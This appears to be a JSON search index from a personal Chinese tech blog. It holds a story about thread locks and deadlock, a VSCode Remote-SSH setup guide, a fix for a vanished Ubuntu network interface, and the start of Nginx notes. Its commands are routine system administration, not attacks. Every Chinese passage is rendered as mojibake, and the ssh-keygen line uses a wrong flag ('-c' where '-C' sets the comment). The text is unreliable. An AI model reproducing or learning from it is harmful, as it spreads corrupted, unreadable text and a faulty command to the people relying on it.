æˆ‘æ˜¯ä¸€ä¸ªçº¿ç¨‹","uri":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["ç å†œç¿»èº«"],"content":"ç¬¬ä¸‰å› è™å£è„±é™© å‰å‡ å¤©æˆ‘é‡åˆ°ä¸€ä¸ªå¯æ€•çš„äº‹æƒ…ï¼Œå·®ä¸€ç‚¹æ­»åœ¨å¤–è¾¹ï¼Œå›ä¸äº†çº¿ç¨‹æ± äº†ã€‚å…¶å®è¿™æ¬¡é‡é™©æˆ‘åº”è¯¥èƒ½å¤Ÿé¢„æƒ³å¾—åˆ°æ‰å¯¹ï¼ŒçœŸæ˜¯å¤ªå¤§æ„äº†ã€‚ é‚£å¤©æˆ‘å¤„ç†äº†ä¸€äº›ä»httpå‘æ¥çš„å­˜æ¬¾å’Œå–æ¬¾çš„åŒ…è£¹ï¼Œè€çº¿ç¨‹0x6900ç‰¹æ„å˜±å’æˆ‘ï¼šâ€œå¤„ç†è¿™äº›åŒ…è£¹çš„æ—¶å€™ä¸€å®šè¦ç‰¹åˆ«å°å¿ƒï¼Œä½ å¿…é¡»å…ˆè·å¾—ä¸€æŠŠé”ï¼Œåœ¨å¯¹è´¦æˆ·å­˜æ¬¾æˆ–å–æ¬¾çš„æ—¶å€™ä¸€å®šè¦æŠŠè´¦æˆ·é”ä½ï¼Œè¦ä¸ç„¶åˆ«çš„çº¿ç¨‹å°±ä¼šåœ¨ä½ ç­‰å¾…çš„æ—¶å€™è¶è™šè€Œå…¥ï¼Œæç ´åï¼Œæˆ‘å¹´è½»é‚£ä¼šå„¿å¾ˆæ¯›ç³™ï¼Œå°±æ…äº†ç¯“å­ã€‚â€ // é«˜å±æ“ä½œï¼Œä¸€å®šåŠ é”ï¼Œé¿å…å¤„ç†è¿‡ç¨‹ä¸­è¢«å…¶ä»–çº¿ç¨‹ä¿®æ”¹äº†èµ„æºæ•°æ® ä¸ºäº†â€œæå“â€æˆ‘ï¼Œ å¥½å¿ƒçš„0x6900è¿˜ç»™äº†æˆ‘ä¸¤ä¸ªè¡¨æ ¼ï¼š (1) æ²¡æœ‰åŠ é”çš„æƒ…å†µ // å› ä¸ºæ²¡æœ‰åŠ é”ï¼Œä¸¤ä¸ªçº¿ç¨‹æ“ä½œäº†åŒæ ·çš„èµ„æºæ•°æ®ï¼Œå¯¼è‡´çº¿ç¨‹1æ²¡æœ‰åŒæ­¥çº¿ç¨‹2æ“ä½œåçš„æ•°æ®ç»“æœï¼Œå‡ºç°äº†é”™è¯¯è®¡ç®— (2) åŠ é”çš„æƒ…å†µ // åœ¨åŠ é”ä¹‹åï¼Œå› ä¸ºçº¿ç¨‹1åŠ äº†é”ï¼Œåœ¨å®Œæˆè‡ªå·±çš„æ“ä½œå‰ï¼Œçº¿ç¨‹2æ²¡æœ‰åŠæ³•æ“ä½œå…±äº«çš„æ•°æ®ï¼Œåªæœ‰åœ¨çº¿ç¨‹1æ“ä½œå®Œæˆåï¼Œçº¿ç¨‹2æ‰èƒ½æ“ä½œå…±äº«æ•°æ®ï¼Œç¡®ä¿äº†æ•°æ®çš„ä¸€è‡´æ€§ã€‚å¯ä»¥æŠŠåŠ é”æ“ä½œçœ‹ä½œåˆ›å»ºä¸€ä¸ªåŸå­æ“ä½œæ¥ç¡®ä¿æ•°æ®çš„å®‰å…¨ã€‚ æˆ‘çœ‹å¾—èƒ†é¢¤å¿ƒæƒŠï¼ŒåŸæ¥ä¸åŠ é”ä¼šå¸¦æ¥è¿™ä¹ˆä¸¥é‡çš„äº‹æ•…ã€‚ä»æ­¤ä»¥åçœ‹åˆ°å­˜æ¬¾ã€å–æ¬¾çš„åŒ…è£¹å°±å€åŠ å°å¿ƒï¼Œè¿˜å¥½æ²¡æœ‰å‡ºè¿‡äº‹æ•…ã€‚ ä»Šå¤©æˆ‘æ”¶åˆ°çš„ä¸€ä¸ªåŒ…è£¹æ˜¯è½¬è´¦ï¼Œä»æŸè‘—åæ¼”å‘˜çš„è´¦æˆ·ç»™æŸè‘—åå¯¼æ¼”çš„è´¦æˆ·è½¬é’±ï¼Œå…·ä½“æ˜¯è°æˆ‘å°±ä¸é€æ¼äº†ï¼Œæ•°é¢å¯çœŸæ˜¯ä¸å°ã€‚ æˆ‘æŒ‰ç…§è€çº¿ç¨‹çš„å©å’ï¼Œè‚¯å®šè¦åŠ é”å•Šï¼Œå…ˆå¯¹è‘—åæ¼”å‘˜çš„è´¦æˆ·åŠ é”ï¼Œå†å¯¹è‘—åå¯¼æ¼”çš„è´¦æˆ·åŠ é”ã€‚ å¯æˆ‘ä¸‡ä¸‡æ²¡æƒ³åˆ°çš„æ˜¯ï¼Œè¿˜æœ‰ä¸€ä¸ªçº¿ç¨‹ï¼Œå¯¹ï¼Œå°±æ˜¯0x7954, ç«Ÿç„¶åŒæ—¶åœ¨ä»è¿™ä¸ªå¯¼æ¼”çš„è´¦æˆ·å¾€è¿™ä¸ªæ¼”å‘˜çš„è´¦æˆ·è½¬è´¦ã€‚ äºæ˜¯ä¹ï¼Œå°±å‡ºç°äº†è¿™ä¹ˆä¸ªæƒ…å†µï¼š // æ­»é” åˆšå¼€å§‹æˆ‘è¿˜ä¸çŸ¥é“ä»€ä¹ˆæƒ…å†µï¼Œä¸€ç›´ååœ¨ç­‰å¾…è½¦é—´å‚»ç­‰ï¼Œå¯æ˜¯ç­‰çš„æ—¶é—´å¤ªé•¿äº†ï¼Œé•¿è¾¾å‡ åç§’ï¼æˆ‘å¯ä»æ¥æ²¡æœ‰ç»å†è¿‡è¿™æ ·çš„äº‹ä»¶ã€‚ è¿™æ—¶å€™æˆ‘å°±çœ‹åˆ°äº†çº¿ç¨‹0x7954 , ä»–æ‚ é—²åœ°ååœ¨é‚£é‡Œå–å’–å•¡ï¼Œæˆ‘å’Œä»–èŠäº†èµ·æ¥ï¼š â€œå“¥ä»¬ï¼Œæˆ‘çœ‹ä½ å·²ç»å–äº†8æ¯å’–å•¡äº†ï¼Œæ€ä¹ˆè¿˜ä¸å»å¹²æ´»ï¼Ÿâ€ â€œä½ ä¸å–äº†9æ¯èŒ¶äº†å—ï¼Ÿâ€0x7954å›æ•¬é“ã€‚ â€œæˆ‘åœ¨ç­‰ä¸€ä¸ªé”ï¼Œä¸çŸ¥é“å“ªä¸ªå­™å­ä¸€ç›´ä¸é‡Šæ”¾ï¼â€ â€œæˆ‘ä¹Ÿåœ¨ç­‰é”å•Šï¼Œæˆ‘è¦æ˜¯çŸ¥é“å“ªä¸ªå­™å­ä¸é‡Šæ”¾é”æˆ‘éææ­»ä»–ä¸å¯ï¼â€0x7954æ¯«ä¸ç¤ºå¼±ã€‚ æˆ‘å·å·åœ°çœ‹äº†ä¸€çœ¼ï¼Œè¿™å®¶ä¼™æ€€é‡Œä¸å°±æŠ±ç€æˆ‘æ­£ç­‰çš„æŸå¯¼æ¼”çš„é”å—ï¼Ÿ å¾ˆæ˜æ˜¾ï¼Œ0x7954ä¹Ÿå‘ç°äº†æˆ‘æ­£æŠ±ç€ä»–æ­£åœ¨ç­‰å¾…çš„é”ã€‚ å¾ˆå¿«æˆ‘ä»¬ä¸¤ä¸ªå°±åµäº†èµ·æ¥ï¼Œäº’ä¸ç›¸è®©ï¼š â€œæŠŠä½ çš„é”å…ˆç»™æˆ‘ï¼Œè®©æˆ‘å…ˆåšå®Œï¼â€ â€œä¸è¡Œï¼Œä»æ¥éƒ½æ˜¯åšå®Œå·¥ä½œæ‰é‡Šæ”¾é”ï¼Œç°åœ¨ç»å¯¹ä¸èƒ½ç»™ä½ ï¼â€ ä»äº‰åµåˆ°æ‰“èµ·æ¥ï¼Œå°±é‚£ä¹ˆå‡ ç§’é’Ÿçš„äº‹å„¿ã€‚æ›´é‡è¦çš„æ˜¯ï¼Œæˆ‘ä»¬ä¿©ä¸ä»…ä»…æŒæœ‰è¿™ä¸ªè‘—åå¯¼æ¼”å’Œæ¼”å‘˜çš„é”ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„é”ï¼Œå¯¼è‡´ç­‰å¾…çš„çº¿ç¨‹è¶Šæ¥è¶Šå¤šï¼Œå›´è§‚çš„äººä»¬æŠŠå±‹å­éƒ½æŒ¤æ»¡äº†ã€‚æœ€åäº‹æƒ…çœŸçš„é—¹å¤§äº†ï¼Œæˆ‘ä»æ¥æ²¡è§è¿‡çš„ç»ˆæå¤§bossâ€œæ“ä½œç³»ç»Ÿâ€ä¹Ÿæ¥äº†ã€‚å¤§Bossæ¯•ç«Ÿè§å¤šè¯†å¹¿ï¼Œä»–çœ‹äº†ä¸€çœ¼ï¼Œå“¼äº†ä¸€å£°ï¼Œå¾ˆä¸å±‘åœ°è¯´ï¼š â€œåˆå‡ºç°æ­»é”äº†ã€‚â€ â€œä½ ä»¬ä¿©è¦Killæ‰ä¸€ä¸ªï¼Œæ¥å§ï¼Œè¿‡æ¥æŠ½ç­¾ã€‚â€ // æŠ½ç­¾å°±å¾ˆå½¢è±¡ï¼Œäººå„æœ‰å‘½ï¼Œè‡ªç„¶å¤©æˆ è¿™ä¸€ä¸‹å­æŠŠæˆ‘ç»™å“å°¿äº†ï¼Œè¿™ä¹ˆä¸¥é‡å•Šï¼æˆ‘æˆ˜æˆ˜å…¢å…¢åœ°æŠ½äº†ç­¾ï¼Œæ‰“å¼€ä¸€çœ‹ï¼Œæ˜¯ä¸ªâ€œæ´»â€å­—ã€‚å”‰ï¼Œå°å‘½ç»ˆäºä¿ä½äº†ã€‚ å¯æ€œçš„0x7954è¢«è¿«äº¤å‡ºäº†æ‰€æœ‰çš„èµ„æºä»¥åï¼Œå¾ˆä¸å¹¸åœ°è¢«killæ‰ï¼Œæ¶ˆå¤±äº†ã€‚æˆ‘æ‹¿åˆ°äº†å¯¼æ¼”çš„é”ï¼Œå¯ä»¥å¼€å§‹å¹²æ´»äº†ã€‚å¤§Bossâ€œæ“ä½œç³»ç»Ÿâ€å¦‚ä¸€é˜µé£ä¼¼çš„æ¶ˆå¤±äº†ï¼Œèº«ååªä¼ æ¥ä»–çš„å£°éŸ³ï¼š â€œè®°ä½ï¼Œæˆ‘ä»¬è¿™é‡Œå¯¼æ¼”\u003eæ¼”å‘˜ï¼Œæ— è®ºä»»ä½•æƒ…å†µéƒ½è¦å…ˆè·å¾—å¯¼æ¼”çš„é”ã€‚â€ // é”çš„ä¼˜å…ˆçº§ ç”±äºè¿™é‡Œä¸ä»…ä»…åªæœ‰å¯¼æ¼”å’Œæ¼”å‘˜ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–äººï¼Œå¤§Bossç•™ä¸‹äº†ä¸€ä¸ªè¡¨æ ¼ï¼Œ é‡Œè¾¹æ˜¯ä¸ªç®—æ³•ï¼Œç”¨æ¥è®¡ç®—èµ„æºçš„å¤§å°ï¼Œè®¡ç®—å‡ºæ¥ä»¥åï¼Œæ°¸è¿œæŒ‰ç…§ä»å¤§åˆ°å°çš„æ–¹å¼æ¥è·å¾—é”ï¼š æˆ‘å›åˆ°çº¿ç¨‹æ± ï¼Œå¤§å®¶éƒ½çŸ¥é“äº†æˆ‘çš„å†é™©ï¼Œå›´ç€æˆ‘é—®ä¸ªä¸åœã€‚ å‡¶ç¥æ¶ç…çš„çº¿ç¨‹è°ƒåº¦å‘˜æŠŠå¤§Bossçš„ç®—æ³•è´´åˆ°äº†å¢™ä¸Šã€‚ æ¯å¤©æ—©ä¸Šï¼Œæˆ‘ä»¬éƒ½å¾—åƒæ— èŠ‚æ“çš„æˆ¿å±‹ä¸­ä»‹ã€ç¾å®¹ç¾å‘åº—çš„æœåŠ¡å‘˜ä¸€æ ·ï¼Œç«™åœ¨é—¨å£ï¼Œåƒè¢«è€çŒ´ä¸€æ ·å¤§å£°èƒŒè¯µï¼š â€œå¤šä¸ªèµ„æºåŠ é”è¦ç‰¢è®°ï¼Œä¸€å®šè¦æŒ‰Bossçš„ç®—æ³•æ¯”å¤§å°ï¼Œç„¶åä»æœ€å¤§çš„å¼€å§‹åŠ é”ã€‚â€ ","date":"2021-07-11","objectID":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:3:0","tags":["ç å†œç¿»èº«"],"title":"ç å†œç¿»èº« -- æˆ‘æ˜¯ä¸€ä¸ªçº¿ç¨‹","uri":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["ç å†œç¿»èº«"],"content":"ç¬¬å››å› æ±Ÿæ¹–å†è§ åˆè¿‡äº†å¾ˆå¤šå¤©ï¼Œæˆ‘å’Œå…¶ä»–çº¿ç¨‹ä»¬å‘ç°äº†ä¸€ä¸ªå¥‡æ€ªçš„äº‹æƒ…ï¼šåŒ…è£¹çš„å¤„ç†è¶Šæ¥è¶Šç®€å•ï¼Œä¸ç®¡ä»»ä½•åŒ…è£¹ï¼Œä¸ç®¡æ˜¯ç™»å½•ã€æµè§ˆã€å­˜é’±â€¦â€¦å¤„ç†çš„æ­¥éª¤éƒ½æ˜¯ä¸€æ ·çš„, è¿”å›ä¸€ä¸ªå›ºå®šçš„htmlé¡µé¢ã€‚ // ç³»ç»Ÿå‡†å¤‡é‡å¯ï¼Œçº¿ç¨‹æ± å³å°†è¢«é”€æ¯ æœ‰ä¸€æ¬¡æˆ‘å·å·åœ°çœ‹äº†ä¸€çœ¼ï¼Œä¸Šé¢å†™ç€ï¼šâ€œæœ¬ç³»ç»Ÿå°†äºä»Šæ™š 00:00 è‡³4:00 è¿›è¡Œç»´æŠ¤å‡çº§ï¼Œ ç»™æ‚¨å¸¦æ¥çš„ä¸ä¾¿æˆ‘ä»¬æ·±æ„ŸæŠ±æ­‰ï¼â€ æˆ‘å»å‘Šè¯‰äº†è€çº¿ç¨‹0x6904,ä»–å¹äº†ä¸€å£æ°”è¯´ï¼š â€œå”‰ï¼Œæˆ‘ä»¬çš„ç”Ÿå‘½ä¹Ÿåˆ°å¤´äº†ï¼Œçœ‹æ¥é©¬ä¸Šå°±è¦é‡å¯ç³»ç»Ÿï¼Œæˆ‘ä»¬å°±è¦æ¶ˆå¤±äº†ï¼Œå†è§å§å…„å¼Ÿã€‚â€ ç³»ç»Ÿé‡å¯çš„é‚£ä¸€åˆ»ç»ˆäºåˆ°æ¥äº†ã€‚æˆ‘çœ‹åˆ°å±‹å­é‡Œçš„ä¸œè¥¿ä¸€ä¸ªä¸ªçš„ä¸è§äº†ï¼Œç­‰å¾…è½¦é—´ã€å°±ç»ªè½¦é—´ï¼Œç”šè‡³CPUè½¦é—´éƒ½æ…¢æ…¢åœ°æ¶ˆå¤±äº†ã€‚æˆ‘èº«è¾¹çš„çº¿ç¨‹å…„å¼Ÿä¹Ÿè¶Šæ¥è¶Šå°‘ï¼Œæœ€ååªå‰©æˆ‘è‡ªå·±äº†ã€‚ æˆ‘åœ¨ç©ºæ—·çš„åŸé‡ä¸Šå¤§å–Šï¼šâ€œè¿˜æœ‰äººå—ï¼Ÿâ€ æ— äººåº”ç­”ã€‚ æˆ‘ä»¬è¿™ä¸€ä»£çº¿ç¨‹æ± å®Œæˆäº†ä½¿å‘½â€¦â€¦ ä¸è¿‡ä¸‹ä¸€ä»£çº¿ç¨‹æ± å³å°†é‡ç”Ÿï¼ ","date":"2021-07-11","objectID":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:4:0","tags":["ç å†œç¿»èº«"],"title":"ç å†œç¿»èº« -- æˆ‘æ˜¯ä¸€ä¸ªçº¿ç¨‹","uri":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["ç å†œç¿»èº«"],"content":"å‚è€ƒ å…¬ä¼—å· â€“ ç å†œç¿»èº«ï¼ˆå¼ºçƒˆæ¨èï¼ï¼ï¼ï¼‰ ","date":"2021-07-11","objectID":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:5:0","tags":["ç å†œç¿»èº«"],"title":"ç å†œç¿»èº« -- æˆ‘æ˜¯ä¸€ä¸ªçº¿ç¨‹","uri":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["ç å†œç¿»èº«"],"content":"Me çœ‹é›ª [Blog]( ","date":"2021-07-11","objectID":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:6:0","tags":["ç å†œç¿»èº«"],"title":"ç å†œç¿»èº« -- æˆ‘æ˜¯ä¸€ä¸ªçº¿ç¨‹","uri":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"VSCodeè¿œç¨‹è¿æ¥Linux","date":"2021-07-06","objectID":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/","tags":["VSCode"],"title":"Windowsä¸‹VSCodeè¿œç¨‹è¿æ¥Linux","uri":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/"},{"categories":["Misc"],"content":"1. Windowsç¯å¢ƒé…ç½® ç¡®è®¤å®‰è£…äº†openssh Windows10ä¸‹æ£€æŸ¥æ˜¯å¦å·²ç»å®‰è£…OpenSSHçš„æ–¹æ³•ï¼š å¿«æ·é”®Win + Xï¼Œé€‰æ‹©Windows PoweShellï¼ˆç®¡ç†å‘˜ï¼‰ï¼Œè¾“å…¥ä»¥ä¸‹æŒ‡ä»¤ï¼š Get-WindowsCapability -Online | ? Name -like 'OpenSSH*' ","date":"2021-07-06","objectID":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/:1:0","tags":["VSCode"],"title":"Windowsä¸‹VSCodeè¿œç¨‹è¿æ¥Linux","uri":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/"},{"categories":["Misc"],"content":"2. VSCodeåŸºæœ¬é…ç½® å®‰è£…æ‰©å±•Remote-SSH åœ¨åº”ç”¨å•†åº—ä¸­å®‰è£…æ‰©å±•â€œRemote-SSHâ€ï¼š é…ç½®åŸºæœ¬config åœ¨æ‰©å±•è®¾ç½®ä¸­å¼€å¯terminalæ˜¾ç¤º çº¢æ¡†å¤„æ‰“ä¸Šé’©é€‰ä¸­ã€‚ ","date":"2021-07-06","objectID":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/:2:0","tags":["VSCode"],"title":"Windowsä¸‹VSCodeè¿œç¨‹è¿æ¥Linux","uri":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/"},{"categories":["Misc"],"content":"3. æƒé™æ›´æ”¹ æ›´æ”¹C:/Users/v4ler1an/.sshçš„æ–‡ä»¶å¤¹æƒé™ï¼š â€œå±æ€§â€ -\u003e â€œå®‰å…¨â€ -\u003e â€œé«˜çº§â€ -\u003e ç¦ç”¨ç»§æ‰¿ï¼Œç„¶åé‡æ–°æ·»åŠ ç”¨æˆ·æƒé™ã€‚ ","date":"2021-07-06","objectID":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/:3:0","tags":["VSCode"],"title":"Windowsä¸‹VSCodeè¿œç¨‹è¿æ¥Linux","uri":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/"},{"categories":["Misc"],"content":"4. æ— éœ€å¯†ç è‡ªåŠ¨ç™»å½• serverç«¯/etc/ssh/sshd_configé…ç½®æ–‡ä»¶å¼€å¯äº†PubkeyAuthenticationï¼› Windowsæœ¬åœ°ç”Ÿæˆå¯†é’¥ï¼š ssh-keygen -t rsa -c \"email@email.com\" ç”Ÿæˆçš„å¯†é’¥ä¿å­˜åœ¨C:/Users/xxx/.sshæ–‡ä»¶å¤¹ä¸‹ å°†id_rsa.pubå…¬é’¥å†…å®¹å¤åˆ¶åˆ°serverçš„/home/xxx/.ssh/authorized_keysæ–‡ä»¶ä¸­ï¼› é‡å¯serverä¸Šçš„sshdæœåŠ¡ï¼Œé‡æ–°è¿æ¥ï¼Œå³å¯å®ç°æ— éœ€å¯†ç è¿œç¨‹è¿æ¥ ","date":"2021-07-06","objectID":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/:4:0","tags":["VSCode"],"title":"Windowsä¸‹VSCodeè¿œç¨‹è¿æ¥Linux","uri":"/2021/07/windows%E4%B8%8B%E9%85%8D%E7%BD%AEvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux/"},{"categories":["Misc"],"content":"Ubuntu 20.04 ç½‘ç»œens33æ¶ˆå¤±é—®é¢˜è§£å†³","date":"2021-05-25","objectID":"/2021/05/ubuntu/","tags":["nginx"],"title":"Ubuntu 20.04 ç½‘ç»œens33æ¶ˆå¤±é—®é¢˜è§£å†³","uri":"/2021/05/ubuntu/"},{"categories":["Misc"],"content":"Ubuntu 20.04 ç½‘ç»œens33æ¶ˆå¤±é—®é¢˜è§£å†³ ","date":"2021-05-25","objectID":"/2021/05/ubuntu/:0:0","tags":["nginx"],"title":"Ubuntu 20.04 ç½‘ç»œens33æ¶ˆå¤±é—®é¢˜è§£å†³","uri":"/2021/05/ubuntu/"},{"categories":["Misc"],"content":"Ubuntu 20.04 çªç„¶ä¸¢å¤±ç½‘å¡é©±åŠ¨ ","date":"2021-05-25","objectID":"/2021/05/ubuntu/:1:0","tags":["nginx"],"title":"Ubuntu 20.04 ç½‘ç»œens33æ¶ˆå¤±é—®é¢˜è§£å†³","uri":"/2021/05/ubuntu/"},{"categories":["Misc"],"content":"1. é—®é¢˜æè¿° Ubuntu 20.04 LTSç‰ˆæœ¬ï¼Œåœ¨è¿›è¡Œä¸€æ¬¡suspendæ“ä½œåï¼Œå‘ç°ç½‘å¡é©±åŠ¨ä¸¢å¤±ã€‚æ‰§è¡Œifconfigå‘½ä»¤æœªå‘ç°æ­£å¸¸çš„eth0æˆ–ens33ç½‘å¡ï¼Œä½†æ˜¯æ‰§è¡Œifconfig -aå¯ä»¥å‘ç°ens33ç½‘å¡å­˜åœ¨ï¼Œä½†æ˜¯æ²¡æœ‰æ­£å¸¸IPã€‚ æ¡Œé¢å³ä¸Šè§’æ²¡æœ‰ç½‘ç»œè¿æ¥çš„å›¾æ ‡ï¼Œåœ¨è®¾ç½®ä¸­ä¹Ÿæ²¡æœ‰ç½‘ç»œè®¾ç½®ç›¸å…³å†…å®¹ã€‚ ","date":"2021-05-25","objectID":"/2021/05/ubuntu/:1:1","tags":["nginx"],"title":"Ubuntu 20.04 ç½‘ç»œens33æ¶ˆå¤±é—®é¢˜è§£å†³","uri":"/2021/05/ubuntu/"},{"categories":["Misc"],"content":"2. è§£å†³ 1. ä¸´æ—¶è§£å†³åŠæ³• æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š sudo dhclient ens33 sudo ifconfig ens33 2. ç¨³å®šè§£å†³åŠæ³• æ¸…ç†åŸæœ‰çš„ç½‘ç»œé…ç½®ç›¸å…³é€‰é¡¹ï¼Œé‡å¯ç½‘ç»œã€‚Ubuntu 20.04ä½¿ç”¨äº†NetworkManager`çš„ç½‘ç»œæœåŠ¡ç®¡ç†ç¨‹åºã€‚æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š service NetworkManager stop # åœæ­¢å½“å‰ç½‘ç»œæœåŠ¡ sudo rm /var/lib/NetworkManager/NetworkManager.state # å»ºè®®åœ¨åˆ é™¤è¯¥çŠ¶æ€æ–‡ä»¶å‰å…ˆè¿›è¡Œå¤‡ä»½ service NetworkManager start # å¯åŠ¨ç½‘ç»œæœåŠ¡ ç»è¿‡ä»¥ä¸Šæ­¥éª¤åï¼Œç½‘ç»œå¯æ¢å¤æ­£å¸¸ã€‚ ","date":"2021-05-25","objectID":"/2021/05/ubuntu/:1:2","tags":["nginx"],"title":"Ubuntu 20.04 ç½‘ç»œens33æ¶ˆå¤±é—®é¢˜è§£å†³","uri":"/2021/05/ubuntu/"},{"categories":["Misc"],"content":"3. æœ€åçš„æœ€å é‡ç½®è™šæ‹Ÿç½‘ç»œé…ç½®å™¨ã€‚è¿™æ˜¯æœ€åçš„åŠæ³•ï¼Œå®åœ¨æ— æ³•ç¡®å®šç½‘ç»œé—®é¢˜åŸå› æ—¶å†ä½¿ç”¨ã€‚ ","date":"2021-05-25","objectID":"/2021/05/ubuntu/:1:3","tags":["nginx"],"title":"Ubuntu 20.04 ç½‘ç»œens33æ¶ˆå¤±é—®é¢˜è§£å†³","uri":"/2021/05/ubuntu/"},{"categories":["Misc"],"content":"è®°å½•ä¸€ä¸‹Nginxä¸­æ¯”è¾ƒåŸºç¡€ä½†å¾ˆé‡è¦çš„å…³é”®çŸ¥è¯†ç‚¹ã€‚","date":"2021-05-15","objectID":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/","tags":["nginx"],"title":"Nginxæ ¸å¿ƒçŸ¥è¯†ç‚¹è®°å½•","uri":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"Nginxæ ¸å¿ƒçŸ¥è¯†ç‚¹è®°å½• è®°å½•ä¸€ä¸‹Nginxä¸­æ¯”è¾ƒåŸºç¡€ä½†å¾ˆé‡è¦çš„å…³é”®çŸ¥è¯†ç‚¹ã€‚ ","date":"2021-05-15","objectID":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:0:0","tags":["nginx"],"title":"Nginxæ ¸å¿ƒçŸ¥è¯†ç‚¹è®°å½•","uri":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"Nginx æ ¸å¿ƒæŠ€æœ¯ ","date":"2021-05-15","objectID":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:1:0","tags":["nginx"],"title":"Nginxæ ¸å¿ƒçŸ¥è¯†ç‚¹è®°å½•","uri":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"1. è®¾è®¡ç›®æ ‡ 1. æ€§èƒ½ ç½‘ç»œæ€§èƒ½ï¼šä½¿ç”¨ epoll ç½‘ç»œæ¨¡å‹ï¼Œåœ¨å…¨å¼‚æ­¥æ¨¡å¼ä¸‹åŠå¤šè¿›ç¨‹è€Œéå¤šçº¿ç¨‹æ¨¡å¼çš„æ”¯æŒä¸‹ï¼Œå¯ä»¥å¤„ç†å‡ ä¸‡è‡³å‡ åä¸‡çš„å¹¶å‘è¯·æ±‚ã€‚ ç½‘è·¯æ•ˆç‡ï¼šä½¿ç”¨é•¿è¿æ¥ä»¥å‡å°‘å»ºç«‹ã€å…³é—­å¸¦æ¥çš„ç½‘ç»œäº¤äº’ï¼ŒåŒæ—¶ä½¿ç”¨å‹ç¼©ç®—æ³•æé«˜ç½‘ç»œåˆ©ç”¨ç‡ã€‚ æ—¶å»¶ï¼šä½¿ç”¨å¸¦å®½æ§åˆ¶æŠ€æœ¯ï¼Œä½¿å„ä¼šè¯ä¹‹é—´å¸¦å®½å°½é‡ç›¸ç­‰ 2. å¯é æ€§ 